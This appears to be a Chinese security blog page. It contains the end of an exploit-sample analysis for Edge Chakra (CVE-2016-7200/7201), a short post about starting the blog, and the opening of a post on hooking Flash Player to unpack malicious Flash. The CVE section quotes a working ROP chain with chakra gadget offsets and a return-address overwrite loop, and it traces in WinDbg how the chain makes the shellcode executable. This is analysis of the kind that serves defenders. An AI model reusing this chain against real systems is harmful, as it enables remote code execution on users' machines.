class="line">        0x1000                          // dwSize</div><div class="line">        0x40                            // flNewProtect</div><div class="line">        chakraBase + 0x1DA2CB           // setup args =&gt; call VirtualProtect</div><div class="line">        ...                             // 0x30 garbage (6 * uint64)</div><div class="line">        0                               // In order to pass check</div><div class="line">        ...                             // 0x98 - 0x38 garbage (12 * uint64)</div><div class="line">        shcodeAddr                      // Finally return to our shellcode!</div><div class="line">    */</div><div class="line">    chakraBase.add(<span class="number">0x1DA2F5</span>),</div><div class="line">    shcodeAddr.and(<span class="keyword">new</span> Long(<span class="number">0xFFFFF000</span>, <span class="number">0xFFFFFFFF</span>, <span class="literal">true</span>)),</div><div class="line">    <span class="keyword">new</span> Long(<span class="number">0x1000</span>, <span class="number">0</span>, <span class="literal">true</span>),</div><div class="line">    <span class="keyword">new</span> Long(<span class="number">0x40</span>, <span class="number">0</span>, <span class="literal">true</span>),</div><div class="line">    chakraBase.add(<span class="number">0x1DA2CB</span>),</div><div class="line">    filler, filler, filler, filler, filler, filler,</div><div class="line">    <span class="keyword">new</span> Long(<span class="number">0</span>, <span class="number">0</span>, <span class="literal">true</span>),</div><div class="line">    filler, filler, filler, filler, filler, filler,</div><div class="line">    filler, filler, filler, filler, filler, filler,</div><div class="line">    shcodeAddr</div><div class="line">];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; rop.length; ++i)</div><div class="line">&#123;</div><div class="line">    Write64(retPtrAddr.add(i * <span class="number">8</span>), rop[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意：因为每一次都是重新启动调试，所以，地址会有所变动，不要疑惑这些事。<br>这里，因为我们知道RetPtrAddr会被ROP entry覆写，所以，我们对返回地址设置写断点，看看什么地方会触发这个断点。</p>
<p><img src="/images/CVE-2016-7200_CVE-2016-7201/7_return_ptr_address.png" alt=""><br><img src="/images/CVE-2016-7200_CVE-2016-7201/8_shellcode_address.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0:028&gt; ba w4 14d53fcc88 &quot;.printf \&quot;overwrite ret address\\n\&quot;&quot;</div><div class="line">0:028&gt; g</div><div class="line">overwrite ret address</div><div class="line">chakra!Js::DataView::EntrySetUint32+0x135:</div><div class="line">00007ff9`6b4dc4b5 488b03          mov     rax,qword ptr [rbx] ds:00000126`02a2d200=0000012605170000</div></pre></td></tr></table></figure>
<pre>
<code>
0:012> kn
 # Child-SP          RetAddr           Call Site
00 00000014`d53fb9a0 00007ff9`6b261393 chakra!Js::DataView::EntrySetUint32+0x135
01 00000014`d53fba10 00007ff9`6b12d873 chakra!amd64_CallFunction+0x93
02 00000014`d53fba80 00007ff9`6b12cfb0 chakra!Js::JavascriptFunction::CallFunction&lt;1>+0x83
03 00000014`d53fbae0 00007ff9`6b261393 chakra!Js::JavascriptFunction::EntryCall+0xf0
04 00000014`d53fbb30 00007ff9`6b12ef6d chakra!amd64_CallFunction+0x93
05 00000014`d53fbba0 00007ff9`6b132797 chakra!Js::InterpreterStackFrame::OP_CallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0> > > >+0x15d
06 00000014`d53fbc40 00007ff9`6b136842 chakra!Js::InterpreterStackFrame::OP_ProfiledCallIWithICIndex&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0> > >+0xa7
07 00000014`d53fbcc0 00007ff9`6b134aa2 chakra!Js::InterpreterStackFrame::ProcessProfiled+0x132
08 00000014`d53fbd50 00007ff9`6b138b5e chakra!Js::InterpreterStackFrame::Process+0x142
09 00000014`d53fbdb0 00007ff9`6b13a265 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x48e
0a 00000014`d53fc120 00000126`05420e9a chakra!Js::InterpreterStackFrame::InterpreterThunk+0x55
0b 00000014`d53fc170 00007ff9`6b261393 0x00000126`05420e9a
0c 00000014`d53fc1a0 00007ff9`6b12d873 chakra!amd64_CallFunction+0x93
0d 00000014`d53fc200 00007ff9`6b130490 chakra!Js::JavascriptFunction::CallFunction&lt;1>+0x83
0e 00000014`d53fc260 00007ff9`6b134f35 chakra!Js::InterpreterStackFrame::OP_CallI&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallI&lt;Js::LayoutSizePolicy&lt;0> > > >+0x110
0f 00000014`d53fc2b0 00007ff9`6b134bb0 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x315
10 00000014`d53fc340 00007ff9`6b138b5e chakra!Js::InterpreterStackFrame::Process+0x250
11 00000014`d53fc3a0 00007ff9`6b13a265 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x48e
12 00000014`d53fc8d0 00000126`05420f92 chakra!Js::InterpreterStackFrame::InterpreterThunk+0x55
13 00000014`d53fc920 00007ff9`6b261393 0x00000126`05420f92
14 00000014`d53fc950 00007ff9`6b12d873 chakra!amd64_CallFunction+0x93
15 00000014`d53fc9a0 00007ff9`6b19c2ec chakra!Js::JavascriptFunction::CallFunction&lt;1>+0x83
16 00000014`d53fca00 00007ff9`6b19b8b6 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x104
17 00000014`d53fcaf0 00007ff9`6b246259 chakra!Js::JavascriptFunction::CallRootFunction+0x4a
18 00000014`d53fcb60 00007ff9`6b1a1d41 chakra!ScriptSite::CallRootFunction+0xb5
19 00000014`d53fcc00 <font color="red"><b>00007ff9`6b1ca2f5</b></font> chakra!ScriptSite::Execute+0x131
1a 00000014`d53fcc90 00000000`00000000 chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper>::ProtectPages+0xe5

0:012> ?chakra+0x1DA2F5
Evaluate expression: 140709220623093 =<font color="red"><b> 00007ff9`6b1ca2f5</b></font>
</code>
</pre>

<p>通过上面的调用栈可以看到以下信息：</p>
<ul>
<li>返回地址被覆写的动作是发生在Js::DataView::EntrySetUint32，这个与我们从sample上看到的也是一致的</li>
<li>覆写的返回地址是chakra!ScriptSite::Execute，这一点与前面介绍的info leak部分是一致的</li>
<li>当chakra!ScriptSite::Execute执行以后，就会跳到ROP的地方</li>
</ul>
<p>下面可以在Execute的ret指令的地方下断点看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">bp chakra+1b1d81 &quot;.printf \&quot;return instruction in ScriptSite::Execute\\n\&quot;&quot;</div><div class="line">0:012&gt; g</div><div class="line">Breakpoint 2 hit</div><div class="line">chakra!ScriptSite::Execute+0x171:</div><div class="line">00007ff9`6b1a1d81 c3              ret</div><div class="line">0:012&gt; kn</div><div class="line"> # Child-SP          RetAddr           Call Site</div><div class="line">00 00000014`d53fcc88 00007ff9`6b1ca2f5 chakra!ScriptSite::Execute+0x171</div><div class="line">01 00000014`d53fcc90 00007ff9`6b1ca2cb chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xe5</div><div class="line">02 00000014`d53fccb0 00000126`05297038 chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xbb</div><div class="line">03 00000014`d53fcd50 00000000`00000000 0x00000126`05297038</div></pre></td></tr></table></figure></p>
<pre>
<code>
0:012> dq rsp
00000014`d53fcc88  <font color="red"><b>00007ff9`6b1ca2f5</b></font> 00000126`05297000
00000014`d53fcc98  00000000`00001000 00000000`00000040
00000014`d53fcca8  00007ff9`6b1ca2cb 00000000`00000000
00000014`d53fccb8  00000000`00000000 00000000`00000000
00000014`d53fccc8  00000000`00000000 00000000`00000000
00000014`d53fccd8  00000000`00000000 00000000`00000000
00000014`d53fcce8  00000126`052fbfd0 00000000`00000000
</code>
</pre>

<p>Return以后，就可以直接进入ROP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0:012&gt; u rip l4</div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xe5:</div><div class="line">00007ff9`6b1ca2f5 5f              pop     rdi</div><div class="line">00007ff9`6b1ca2f6 5e              pop     rsi</div><div class="line">00007ff9`6b1ca2f7 5b              pop     rbx</div><div class="line">00007ff9`6b1ca2f8 c3              ret</div><div class="line">0:012&gt; dq rsp</div><div class="line">00000014`d53fcc90  00000126`05297000 00000000`00001000</div><div class="line">00000014`d53fcca0  00000000`00000040 00007ff9`6b1ca2cb</div></pre></td></tr></table></figure>
<p>执行完三个pop以后，可以看到相应的寄存器中，已经保存了相应的值，这里，RDI存放的是shellcode的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">0:012&gt; r</div><div class="line">rax=0000000000000000 rbx=0000000000000040 rcx=00000014d53fcc28</div><div class="line">rdx=0000000000008040 rsi=0000000000001000 rdi=0000012605297000</div><div class="line">rip=00007ff96b1ca2f8 rsp=00000014d53fcca8 rbp=00000014d53fcf41</div><div class="line"> r8=00000000ffff8000  r9=0000000000000800 r10=0000000000001000</div><div class="line">r11=0000000000000080 r12=0000012602a2d200 r13=0000012602a50570</div><div class="line">r14=0000000000000000 r15=0000012605192f40</div><div class="line">iopl=0         nv up ei pl nz na po nc</div><div class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xe8:</div><div class="line">00007ff9`6b1ca2f8 c3              ret</div></pre></td></tr></table></figure>
<p>执行最后一个Return以后，会来到这里，这里不像传统的ROP，但是，目的都是一样的，修改指定地址的保护权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div></pre></td><td class="code"><pre><div class="line">0:012&gt; uf 00007ff96b1ca2cb</div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages:</div><div class="line">00007ff9`6b1ca210 4c8bdc          mov     r11,rsp</div><div class="line">00007ff9`6b1ca213 4d894b20        mov     qword ptr [r11+20h],r9</div><div class="line">00007ff9`6b1ca217 4d894318        mov     qword ptr [r11+18h],r8</div><div class="line">00007ff9`6b1ca21b 49895310        mov     qword ptr [r11+10h],rdx</div><div class="line">00007ff9`6b1ca21f 49894b08        mov     qword ptr [r11+8],rcx</div><div class="line">00007ff9`6b1ca223 53              push    rbx</div><div class="line">00007ff9`6b1ca224 56              push    rsi</div><div class="line">00007ff9`6b1ca225 57              push    rdi</div><div class="line">00007ff9`6b1ca226 4881ec80000000  sub     rsp,80h</div><div class="line">00007ff9`6b1ca22d 49c743a8feffffff mov     qword ptr [r11-58h],0FFFFFFFFFFFFFFFEh</div><div class="line">00007ff9`6b1ca235 488bfa          mov     rdi,rdx</div><div class="line">00007ff9`6b1ca238 48f7c2ff0f0000  test    rdx,0FFFh</div><div class="line">00007ff9`6b1ca23f 0f85b4000000    jne     chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xe9 (00007ff9`6b1ca2f9)  Branch</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0x35:</div><div class="line">00007ff9`6b1ca245 498bc9          mov     rcx,r9</div><div class="line">00007ff9`6b1ca248 488b5110        mov     rdx,qword ptr [rcx+10h]</div><div class="line">00007ff9`6b1ca24c 483bfa          cmp     rdi,rdx</div><div class="line">00007ff9`6b1ca24f 0f82a4000000    jb      chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xe9 (00007ff9`6b1ca2f9)  Branch</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0x45:</div><div class="line">00007ff9`6b1ca255 488b4920        mov     rcx,qword ptr [rcx+20h]</div><div class="line">00007ff9`6b1ca259 498bf0          mov     rsi,r8</div><div class="line">00007ff9`6b1ca25c 492bc8          sub     rcx,r8</div><div class="line">00007ff9`6b1ca25f 48c1e10c        shl     rcx,0Ch</div><div class="line">00007ff9`6b1ca263 8bc7            mov     eax,edi</div><div class="line">00007ff9`6b1ca265 2bc2            sub     eax,edx</div><div class="line">00007ff9`6b1ca267 483bc1          cmp     rax,rcx</div><div class="line">00007ff9`6b1ca26a 0f8789000000    ja      chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xe9 (00007ff9`6b1ca2f9)  Branch</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0x60:</div><div class="line">00007ff9`6b1ca270 41b830000000    mov     r8d,30h</div><div class="line">00007ff9`6b1ca276 498d53b0        lea     rdx,[r11-50h]</div><div class="line">00007ff9`6b1ca27a 488bcf          mov     rcx,rdi</div><div class="line">00007ff9`6b1ca27d ff150d824000    call    qword ptr [chakra!_imp_VirtualQuery (00007ff9`6b5d2490)]</div><div class="line">00007ff9`6b1ca283 4885c0          test    rax,rax</div><div class="line">00007ff9`6b1ca286 7471            je      chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xe9 (00007ff9`6b1ca2f9)  Branch</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0x78:</div><div class="line">00007ff9`6b1ca288 48c1e60c        shl     rsi,0Ch</div><div class="line">00007ff9`6b1ca28c 4839742460      cmp     qword ptr [rsp+60h],rsi</div><div class="line">00007ff9`6b1ca291 7266            jb      chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xe9 (00007ff9`6b1ca2f9)  Branch</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0x83:</div><div class="line">00007ff9`6b1ca293 8b44246c        mov     eax,dword ptr [rsp+6Ch]</div><div class="line">00007ff9`6b1ca297 398424c8000000  cmp     dword ptr [rsp+0C8h],eax</div><div class="line">00007ff9`6b1ca29e 7559            jne     chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xe9 (00007ff9`6b1ca2f9)  Branch</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0x90:</div><div class="line">00007ff9`6b1ca2a0 8b9c24c0000000  mov     ebx,dword ptr [rsp+0C0h]</div><div class="line">00007ff9`6b1ca2a7 8bc3            mov     eax,ebx</div><div class="line">00007ff9`6b1ca2a9 83e070          and     eax,70h</div><div class="line">00007ff9`6b1ca2ac 0f95c2          setne   dl</div><div class="line">00007ff9`6b1ca2af 0fbae31e        bt      ebx,1Eh</div><div class="line">00007ff9`6b1ca2b3 0f93c1          setae   cl</div><div class="line">00007ff9`6b1ca2b6 84d1            test    cl,dl</div><div class="line">00007ff9`6b1ca2b8 753f            jne     chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xe9 (00007ff9`6b1ca2f9)  Branch</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xaa:</div><div class="line">00007ff9`6b1ca2ba 85c0            test    eax,eax</div><div class="line">00007ff9`6b1ca2bc 744c            je      chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xfa (00007ff9`6b1ca30a)  Branch</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xae:</div><div class="line">00007ff9`6b1ca2be b201            mov     dl,1</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xb0:</div><div class="line">00007ff9`6b1ca2c0 488d4c2430      lea     rcx,[rsp+30h]</div><div class="line">00007ff9`6b1ca2c5 e88e370000      call    chakra!Memory::AutoEnableDynamicCodeGen::AutoEnableDynamicCodeGen (00007ff9`6b1cda58)</div><div class="line">00007ff9`6b1ca2ca 90              nop</div><div class="line">00007ff9`6b1ca2cb 4c8d4c2438      lea     r9,[rsp+38h]</div><div class="line">00007ff9`6b1ca2d0 448bc3          mov     r8d,ebx   &lt;--- parameter 3</div><div class="line">00007ff9`6b1ca2d3 488bd6          mov     rdx,rsi   &lt;--- parameter 2</div><div class="line">00007ff9`6b1ca2d6 488bcf          mov     rcx,rdi   &lt;--- parameter 1</div><div class="line">00007ff9`6b1ca2d9 ff15b9814000    call    qword ptr [chakra!_imp_VirtualProtect (00007ff9`6b5d2498)]   &lt;--- call VirtualProtect</div><div class="line">00007ff9`6b1ca2df 8bd8            mov     ebx,eax</div><div class="line">00007ff9`6b1ca2e1 807c243000      cmp     byte ptr [rsp+30h],0</div><div class="line">00007ff9`6b1ca2e6 0f8502080f00    jne     chakra!Js::MissingPropertyTypeHandler::IsObjTypeSpecEquivalent+0x5237e (00007ff9`6b2baaee)  Branch</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xdc:</div><div class="line">00007ff9`6b1ca2ec 8bc3            mov     eax,ebx</div><div class="line"></div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xde:</div><div class="line">00007ff9`6b1ca2ee 4881c480000000  add     rsp,80h</div><div class="line">00007ff9`6b1ca2f5 5f              pop     rdi</div><div class="line">00007ff9`6b1ca2f6 5e              pop     rsi</div><div class="line">00007ff9`6b1ca2f7 5b              pop     rbx</div><div class="line">00007ff9`6b1ca2f8 c3              ret</div></pre></td></tr></table></figure>
<p>从上面的call VirtualProtect来看，原先保留的rdi,rsi,rbx是用做其前三个参数的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL WINAPI <span class="title">VirtualProtect</span><span class="params">(</span></span></div><div class="line">  _In_  LPVOID lpAddress,</div><div class="line">  _In_  SIZE_T dwSize,</div><div class="line">  _In_  DWORD  flNewProtect,</div><div class="line">  _Out_ PDWORD lpflOldProtect</div><div class="line">);</div></pre></td></tr></table></figure>
<p>在执行VirtualProtect的前后，看看shellcode 地址的属性是不是发生了变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0:012&gt; bp 00007ff9`6b1ca2d9 &quot;.printf \&quot;call VirtualProtect\\n\&quot;&quot;</div><div class="line">0:012&gt; g</div><div class="line">call VirtualProtect</div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xc9:</div><div class="line">00007ff9`6b1ca2d9 ff15b9814000    call    qword ptr [chakra!_imp_VirtualProtect (00007ff9`6b5d2498)] ds:00007ff9`6b5d2498=&#123;EShims!NS_ACGLockdownTelemetry::APIHook_VirtualProtect (00007ff9`7cc73080)&#125;</div></pre></td></tr></table></figure>
<p>查看调用VirtualProtect之前的shellcode address属性</p>
<pre>
<code>
0:012> !address rdi
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  &lt;unknown&gt;
Base Address:           00000126`05290000
End Address:            00000126`0529d000
Region Size:            00000000`0000d000 (  52.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          <b>PAGE_READWRITE</b>
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00000126`05290000
Allocation Protect:     00000004          PAGE_READWRITE
Content source: 1 (target), length: 1000
</code>
</pre>

<p>单步执行VirtualProtect</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0:012&gt; p</div><div class="line">chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedVirtualAllocWrapper&gt;::ProtectPages+0xcf:</div><div class="line">00007ff9`6b1ca2df 8bd8            mov     ebx,eax</div></pre></td></tr></table></figure>
<p>查看调用VirtualProtect之后的shellcode address属性</p>
<pre>
<code>
0:012> !address rdi
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  &lt;unknown&gt;
Base Address:           00000126`05297000
End Address:            00000126`05298000
Region Size:            00000000`00001000 (   4.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000040          <b><font color="red">PAGE_EXECUTE_READWRITE</font></b>
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00000126`05290000
Allocation Protect:     00000004          PAGE_READWRITE
Content source: 1 (target), length: 1000
</code>
</pre>

<p>看来shellcode地址的属性的确被修改为可执行权限了，虽然这个ROP写的比传统的ROP要简单很多，但是，目的都是一样的，为了修改shellcode所在地址的保护权限。<br>后面就是执行shellcode，有兴趣自己再调试一下吧。</p>
<p><strong>关于漏洞成因分析参考这篇文章</strong><br><a href="http://blogs.360.cn/360safe/2016/11/29/three-roads-lead-to-rome/" target="_blank" rel="external">http://blogs.360.cn/360safe/2016/11/29/three-roads-lead-to-rome/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://michaelpdu.github.io/2017/01/26/CVE-2016-7200-CVE-2016-7201-Edge/" data-id="cizl5jcki0007mszzq0z007ep" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/样本分析/">样本分析</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-begin-github-blog" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/01/13/begin-github-blog/" class="article-date">
  <time datetime="2017-01-13T06:33:15.000Z" itemprop="datePublished">2017-01-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/01/13/begin-github-blog/">开始使用GitHub写blog</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>零零散散在多个站点上写过blog，断断续续写了又停，停了又写。后来，有一天看到泉哥开始在GitHub上写blog，也想将自己的东西写出来，记录下自己的点点滴滴。于是，就开始了动手去搭建GitHub上的blog。</p>
<p>markdown+hexo的确很不错，自己管理，拥有更大的自由。相应的工具也有很多，不推荐了。后面，也会将之前写过的blog，逐渐搬到GitHub上，也希望自己可以坚持写下去，将自己点滴记录下来，留下痕迹。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://michaelpdu.github.io/2017/01/13/begin-github-blog/" data-id="cizl5jcjc0000mszzi7bpn0cc" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-thinking-of-embedded-flash-dump-in-flash-player" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/08/31/thinking-of-embedded-flash-dump-in-flash-player/" class="article-date">
  <time datetime="2016-08-31T13:51:47.000Z" itemprop="datePublished">2016-08-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/08/31/thinking-of-embedded-flash-dump-in-flash-player/">利用flash player脱壳的思路</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>随着混淆工具在恶意flash中的使用越来越流行，一对一的脱壳手法已经不能满足需求，想找一种简便的方案，最后想在flash player中做点文章，既然flash player可以正确地执行flash，那么，脱壳对flash player而言，就不是问题。</p>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>2015年的时候，做过这些事，当时没有记录如何找到hook point的过程，从而导致过了许久以后，出了问题，想重新找到其他版本flash player上的hook point的过程就显得较为耗时。不过，耗时归耗时，还是可以找到，这里将这次找hook point的思路整理出来，方便以后遇到类似问题所使用。</p>
<p>最开始想做这个的时候，有两种思路：</p>
<ul>
<li>flash脱壳会用到loadBytes，那么，可以hook这个JIT函数，因为是JIT函数，所以，在hook之前需要做些其他的事，稍微有些麻烦。下面有两种实现，可以参考：<ul>
<li>F-Secure实现的<a href="https://github.com/F-Secure/Sulo" target="_blank" rel="external">sulo</a>是基于PIN技术做的，本质上也是Hook了loadBytes函数</li>
<li>作者实现的WinDBG plugin： <a href="https://github.com/michaelpdu/flashext" target="_blank" rel="external">flashext</a>，其中，就包括了Hook loadBytes是思路和实现</li>
</ul>
</li>
<li>flash中的JIT函数最后应该还是会调用到flash player的inline函数，我们能不能找到这个点，然后，直接在inline function上做Hook</li>
</ul>
<p>因为第一种思路，作者已经在WinDBG Plugin中有了类似的实现，所以想去找找第二种是否有可能做到，如果能找到，应该会更简单一些。</p>
<p>既然flash player可以将embedded flash解开并加载，那么，肯定会有加载embedded flash的指令，并且这些指令一定会检测magic number，所以，这些magic number就是一个很合适的点。</p>
<h2 id="通过调试器找到准确的加载时机"><a href="#通过调试器找到准确的加载时机" class="headerlink" title="通过调试器找到准确的加载时机"></a>通过调试器找到准确的加载时机</h2><p>通过vmware+debugger的帮助，可以准备一个snapshot，使得在分配embedded flash的地址时是相同的基址，这样，就可以很方便地使用硬件断点来找到读写这个基址的指令。</p>
<p>需要一个断点来辅助我们在加载embedded flash之前停下来，之前，有flashext的帮助，可以在loadbytes JIT function上断下来，而对于Windows 8以后内置的flash而言，之前的flashext也遇到同样的困境，hook point失效了。<br>那么我们需要找到其他的点，也辅助我们完整这个工作，通过搜索strings，可以看到，像FWS/CWS之类的string都没有找到合适的。</p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/1.jpg" alt=""></p>
<p>那么，我们再试试找常量，因为我们知道FWS = \x46\x57\x53，CWS=\x43\x57\x53， ZWS=\x5A\x57\x53， 所以，\x57 \x53如果能够同时出现在一段指令中，说明可能是我们期望的目标。</p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/2.jpg" alt=""></p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/3.jpg" alt=""></p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/4.jpg" alt=""></p>
<p>在这个上下文的指令中可以找到\x43,\x53,\x57之类的常量，我们可以分析一下这些指令的意思，的确也是在比较内存是否是CWS或者FWS之类的东西，太好了，那么，上调试器看看是否就是我们想要找的hook point?</p>
<p>通过下面命令来设置断点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bp Flash+22870A</div></pre></td></tr></table></figure>
<p>在调试环境中可以看到，这个点其实并非我们想要的点，不过，却可以用于辅助我们完成定位读写embedded flash的指令。（如之前使用flashext中给loadBytes设置breakpoint一样）</p>
